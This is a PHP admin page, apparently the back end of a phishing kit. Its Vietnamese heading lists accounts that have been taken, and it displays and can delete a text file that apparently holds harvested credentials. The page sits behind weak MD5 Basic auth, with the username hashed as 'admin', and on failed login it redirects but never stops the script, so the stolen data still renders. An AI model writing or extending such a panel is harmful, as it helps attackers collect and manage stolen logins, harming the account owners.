<?php

$name = '21232f297a57a5a743894a0e4a801fc3';

$pass = 'b23cf2d0fb74b0ffa0cf4c70e6e04926';

if (
    !isset($_SERVER['PHP_AUTH_USER'])

    || md5($_SERVER['PHP_AUTH_USER']) !== $name

    || md5($_SERVER['PHP_AUTH_PW']) !== $pass
) {

    header('WWW-Authenticate: Basic realm="Nhập mật khẩu để tiếp tục"');

    header('HTTP/1.0 401 Unauthorized');

    echo '<script language="javascript">';
    echo'location.href="https://thientran1111.000webhostapp.com"';
    echo '</script>';
}


?>
    <?php
if (isset($_POST['deletetxt'])) {
    unlink('./text/admin.txt');  
    echo '<script language="javascript">';
    echo 'var r = confirm("Are you sure you want to delete?");';
    echo'if(r==true){';
    echo 'alert("Xóa Thành công")';
    echo'}else{';
    echo'header("location:./text/admin.php")';
    echo'}';
    echo '</script>';
    }


?>

        <?php
if (isset($_POST['savetxt'])) {
    echo '<script language="javascript">';
    echo 'alert("Lưu chưa hoạt động")';
    echo '</script>';
}

?>
            <!DOCTYPE html>
            <html lang="en">
            <script src="http://code.jquery.com/jquery.min.js"></script>
            <link href="http://getbootstrap.com/2.3.2/assets/css/bootstrap.css" rel="stylesheet" type="text/css" />
            <link href="http://getbootstrap.com/2.3.2/assets/css/bootstrap-responsive.css" rel="stylesheet" type="text/css" />
            <script src="http://getbootstrap.com/2.3.2/assets/js/bootstrap.js"></script>

            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Document</title>
                <style>
                    body {
                        background-color: #fff;
                    }
                    
                    .container {
                        text-align: center;
                    }
                    
                    input {
                        padding: 10px 15px;
                    }
                    
                    #save {
                        background: green;
                        border: none;
                        color: #ffffff;
                        margin: 0px 10px;
                        outline: none;
                    }
                    
                    #delete {
                        background: darkred;
                        border: none;
                        color: #ffffff;
                        outline: none;
                    }
                    
                    .btn-group {
                        padding: 20px 0px;
                        
                    }
                </style>
            </head>

            <body>
                <div class="col-lg-4" >
                    <h1 >Danh Sách tất cả acc đã via</h1>
                    <hr>
                    <div class="col-lg-12" ">
                        <div class="row">
                            <div class="btn-group">
                                <form action="admin.php" method="POST">
                                    <input id="save" type="button" value="Save" name="">
                                     <input id="delete" type="submit" value="Delete" name="deletetxt">
                                </form>

                            </div>

                        </div>
                    </div>
                    <hr>
                        <div class="text " >
                            <?php
                $fp = fopen("./text/admin.txt", "r"); //mở file ở chế độ đọc
                while (!feof($fp)) {
                    echo fgets($fp)."<br>";
                }
                fclose($fp);
                ?>
                        </div>
                    
                
                </div>
            </body>



            </html>